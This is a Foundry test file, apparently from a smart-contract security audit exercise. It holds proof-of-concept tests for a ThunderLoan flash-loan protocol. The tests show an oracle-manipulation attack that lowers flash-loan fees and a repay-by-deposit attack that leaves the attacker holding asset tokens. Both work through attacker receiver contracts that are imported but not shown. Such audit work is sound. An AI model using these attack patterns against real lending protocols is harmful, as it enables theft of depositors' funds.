// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { AssetToken } from "../../../src/protocol/AssetToken.sol";
import { OracleFlashLoanReceiver } from "./OracleFlashLoanReceiver.sol";
import { OracleDepositWithFlashLoanReceiver } from "./OracleDepositWithFlashLoanReceiver.sol";
import { ThunderLoan } from "../../../src/protocol/ThunderLoan.sol";
import { ERC20Mock } from "../../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

/* we have to create our an tswap pool where  pools of token . 
the reason we are creating this is because, the thunderloan depends on twsapp for price (oralce) in weth
the twsapool create will be similar to the to the one intended to that it thunderloan can read the price 
the twsapool is in the bufftSwapPool Contract
*/
import { BuffMockPoolFactory } from "../../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../../mocks/BuffMockTSwap.sol";

contract ThunderLoanTest is Test {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    OracleFlashLoanReceiver flashLoanReceiver;
    ThunderLoan thunderLoanImplementation;
    OracleDepositWithFlashLoanReceiver flashLoanReceiver2;

    ERC1967Proxy proxy;
    ThunderLoan thunderLoan;
    BuffMockPoolFactory factory;
    BuffMockTSwap pool;
    ERC20Mock weth;
    ERC20Mock tokenA;

    function setUp() public virtual {
        weth = new ERC20Mock();
        tokenA = new ERC20Mock();
        // creating pool factory for twsap
        factory = new BuffMockPoolFactory(address(weth));
        // creating TSwap pool for PoolTokenA
        pool = BuffMockTSwap(factory.createPool(address(tokenA)));
        // adding liquidity to the pool
        addLiquditityToTSwapPool(liquidityProvider, 100e18);

        // creating thunderloan

        thunderLoan = new ThunderLoan();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(factory));
    }

    function addLiquditityToTSwapPool(address _lp, uint256 deposit) internal {
        weth.mint(_lp, deposit);
        tokenA.mint(_lp, deposit);

        vm.startPrank(_lp);
        weth.approve(address(pool), deposit);
        tokenA.approve(address(pool), deposit);

        pool.deposit(deposit, deposit, deposit, block.timestamp);
        console.log("LP has made Deposit in the TSwapPool.......");

        vm.stopPrank();
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoanOracle() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = 50e18;
        // fee for borrowing  100 TokenA
        uint256 normalFee = thunderLoan.getCalculatedFee(tokenA, 100e18);

        vm.startPrank(user);
        flashLoanReceiver = new OracleFlashLoanReceiver(
            address(thunderLoan), address(pool), address(weth), address(thunderLoan.getAssetFromToken(tokenA))
        );
        tokenA.mint(address(flashLoanReceiver), AMOUNT * 10);
        // in the flashloan, we are borrowing 50 TokenA twice --> check the flashloan contract
        thunderLoan.flashloan(address(flashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();
        uint256 attackfee = flashLoanReceiver.fee1() + flashLoanReceiver.fee2();
        console.log("attackfee", attackfee);
        console.log("normalFee", normalFee);
        console.log("fee1,", flashLoanReceiver.fee1());
        console.log("fee2,", flashLoanReceiver.fee2());

        assert(attackfee < normalFee);
        // also fee1 and fee2 are different yet the amount borrowed was the same (50e18)
        assert(flashLoanReceiver.fee1() != flashLoanReceiver.fee2());
    }

    /**
     * In this function, we used a flashloan in a different way.
     * 1. we borrow 50 TokenA with a flashloan
     * 2. Instead of repaying the flashloan with the `repay` function in `thunderloan` we use the deposit function  in
     * the thunderLoan
     *
     */
    function testFlashLoanDepositIntheContractOracle() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = 50e18;
        // fee for borrowing  100 TokenA
        uint256 normalFee = thunderLoan.getCalculatedFee(tokenA, 100e18);

        vm.startPrank(user);
        flashLoanReceiver2 = new OracleDepositWithFlashLoanReceiver(
            address(thunderLoan), address(pool), address(weth), address(thunderLoan.getAssetFromToken(tokenA))
        );
        ////////////////////////////
        // assetTokenOfFlashLoanReceiver2Before and ass
        uint256 assetTokenBalanceOfFlashLoanReceiver2Before =
            thunderLoan.getAssetFromToken(tokenA).balanceOf(address(flashLoanReceiver2));
        console.log(
            "assetTokenBalanceOfFlashLoanReceiver2Before the flashloan attack",
            assetTokenBalanceOfFlashLoanReceiver2Before
        );
        // this amount is minted for repaying flashloan fees in the contract
        tokenA.mint(address(flashLoanReceiver2), AMOUNT * 10);
        // in the flashloan, we are borrowing 50 TokenA twice --> check the flashloan contract
        thunderLoan.flashloan(address(flashLoanReceiver2), tokenA, amountToBorrow, "");
        vm.stopPrank();
        uint256 assetTokenBalanceOfFlashLoanReceiver2After =
            thunderLoan.getAssetFromToken(tokenA).balanceOf(address(flashLoanReceiver2));
        console.log(
            "assetTokenBalanceOfFlashLoanReceiver2After the flashloan attack",
            assetTokenBalanceOfFlashLoanReceiver2After
        );
        uint256 attackfee = flashLoanReceiver2.fee1() + flashLoanReceiver2.fee2();
        console.log("attackfee", attackfee);
        console.log("normalFee", normalFee);
        console.log("fee1,", flashLoanReceiver2.fee1());
        console.log("fee2,", flashLoanReceiver2.fee2());

        //atacker withdraws the assertToken.
        vm.prank(user);
        flashLoanReceiver2.withAssetToken(tokenA);

        assert(attackfee < normalFee);
        // also fee1 and fee2 are different yet the amount borrowed was the same (50e18)
        // assert(flashLoanReceiver2.fee1() != flashLoanReceiver2.fee2());
        assert(assetTokenBalanceOfFlashLoanReceiver2After > assetTokenBalanceOfFlashLoanReceiver2Before);
        // LPs are given assertToken After deposit , the attacker now has aseertTOken after flashloan
    }
}

// thunderLoan = new ThunderLoan();

// proxy = new ERC1967Proxy(address(thunderLoan), "");
// thunderLoan = ThunderLoan(address(proxy));
// thunderLoan.initialize(address(mockPoolFactory));
